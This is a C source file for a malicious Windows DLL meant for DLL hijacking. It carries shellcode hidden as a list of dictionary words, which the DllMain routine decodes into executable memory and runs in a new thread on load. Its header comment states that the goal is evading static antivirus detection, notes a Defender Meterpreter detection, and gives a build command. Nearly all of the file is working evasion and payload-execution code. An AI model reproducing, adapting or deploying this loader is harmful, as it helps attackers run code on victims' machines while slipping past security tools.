/*
    Spawn PowerShell Payload for DLL Hijacking
    13 Nov 2025
    Eric

    Attempt to evade simple static detections by encoding shellcode as dictionary words

    Status:
    Defender - Trojan:Win32/Meterpreter.O - Quarantined

    To build: 
    x86_64-w64-mingw32-gcc -shared -o win64_cmd_exec.dll win64_cmd_exec.c -fpermissive -Wl,-eImageNtHeader
*/
#include <windows.h>

const char* translate_dict[256] = { "discrete","society","reset","exciting","tissue","magic","feels","weather","marvel","browsing","ferry","shanghai","andale","petition","bryan","locks","archive","workflow","arabia","charms","briefing","fuzzy","markets","giant","adelaide","backing","morocco","pressing","roman","protest","bookmark","actors","advert","reprint","cities","regarded","stood","georgia","driven","bradley","relation","loves","language","moves","baskets","london","commands","tourism","doctors","potter","papua","updated","trials","signing","vehicles","prayers","unlock","twiki","bacon","naked","sweet","submit","subject","polls","suites","dynamic","disease","forms","mission","duncan","movers","absent","legally","mcdonald","session","buyer","tyler","search","machines","siemens","netscape","aaron","sources","mails","awesome","seminars","filter","tasks","mercy","samoa","brook","uncle","weddings","womens","hours","handle","opponent","amanda","stretch","adding","teenage","findings","rebates","dealtime","isaac","badge","managers","madonna","soldier","munich","records","theme","oriental","singh","chester","offers","import","choices","valves","tender","favorite","handbook","boots","penalty","class","calvin","focus","running","samsung","bacteria","footage","oxford","barriers","relay","telecom","reason","heather","heavy","interact","movement","transit","klein","council","measure","enter","stephen","sleeping","reveals","genome","inbox","contacts","liberia","volvo","allowed","logical","heater","repair","varies","visiting","homepage","analyzes","overhead","scuba","remote","invite","seasonal","absence","usage","threat","brain","floating","burns","surrey","exterior","marathon","deutsche","apparel","gilbert","doctrine","headset","aircraft","equity","citizens","juvenile","teens","longer","repairs","glasses","league","blocks","hardware","kuwait","albany","carries","login","leader","audio","wizard","placing","product","daily","became","courage","assessed","passing","beast","blowing","lovely","toolkit","trick","counter","human","ruled","prompt","pitch","distance","banking","rapids","feeds","instead","mumbai","extends","albania","acoustic","create","hispanic","criminal","closely","census","ladder","harrison","joshua","hollow","sized","ascii","movies","score","planning","require","strap","convert","sleep","opinion","drivers","school","truly","duration","lenders","parties","const","nokia","presence","empire","citation","downtown","nervous" };

const char* dict_words[282] = { "empire","legally","oxford","census","convert","hollow","albany","discrete","discrete","discrete","dynamic","aaron","dynamic","netscape","sources","aaron","filter","legally","potter","counter","findings","legally","movement","sources","opponent","legally","movement","sources","adelaide","legally","movement",
"sources","advert","legally","movement","chester","netscape","legally","locks","juvenile","session","session","search","potter","became","legally","potter","albany","surrey","sweet","amanda","class","reset","baskets","advert","dynamic","carries","became","petition","dynamic","society",
"carries","criminal","planning","sources","dynamic","aaron","legally","movement","sources","advert","movement","disease","sweet","legally","society","toolkit","movement","samsung","heather","discrete","discrete","discrete","legally","relay","albany","import","dealtime","legally","society","toolkit",
"netscape","movement","legally","adelaide","mission","movement","suites","advert","mcdonald","society","toolkit","closely","filter","legally","nervous","became","dynamic","movement","trials","heather","legally","society","pitch","search","potter","became","legally","potter","albany","surrey",
"dynamic","carries","became","petition","dynamic","society","carries","unlock","create","choices","sleep","tyler","exciting","tyler","stood","marvel","duncan","twiki","trick","choices","banking","mercy","mission","movement","suites","stood","mcdonald","society","toolkit","rebates",
"dynamic","movement","andale","legally","mission","movement","suites","roman","mcdonald","society","toolkit","dynamic","movement","tissue","heather","legally","society","toolkit","dynamic","mercy","dynamic","mercy","hours","samoa","brook","dynamic","mercy","dynamic","samoa","dynamic",
"brook","legally","oxford","score","advert","dynamic","sources","nervous","create","mercy","dynamic","samoa","brook","legally","movement","arabia","sized","tasks","nervous","nervous","nervous","womens","legally","repairs","society","discrete","discrete","discrete","discrete","discrete",
"discrete","discrete","legally","klein","klein","society","society","discrete","discrete","dynamic","repairs","potter","movement","theme","reason","nervous","prompt","glasses","convert","equity","scuba","filter","dynamic","repairs","absence","inbox","blocks","varies","nervous","prompt",
"legally","oxford","audio","relation","sweet","feels","class","ferry","samsung","presence","create","choices","magic","glasses","absent","charms","chester","theme","managers","discrete","samoa","dynamic","heavy","feeds","nervous","prompt","oriental","theme","tender","findings",
"chester","offers","isaac","findings","soldier","soldier","commands","findings","favorite","findings","discrete" };

unsigned char payload[sizeof(dict_words)] = {0}; //placeholder

BOOL WINAPI ImageNtHeader(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH: {
    // Decode shellcode using input Dictionary wordlist "translate_dict"
    for (int sc_index = 0; sc_index < sizeof(payload); sc_index++) // Loop through shellcode words first
    {
        for (int dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
        {
            // If the word was found in the shellcode Dictionary
            if (strcmp(translate_dict[dict_index], dict_words[sc_index]) == 0 ) {
                // Convert shellcode to byte and add to output variable
                payload[sc_index] = dict_index;
                break;
            }
        }
    }
    // Allocate memory for the shellcode
    void* exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem) {
        // Copy the shellcode to the allocated memory
        memcpy(exec_mem, payload, sizeof(payload));

        // Create a thread to execute the shellcode
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        if (hThread) {
            CloseHandle(hThread); // Cleanup
        }
    }
    break;
  }
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}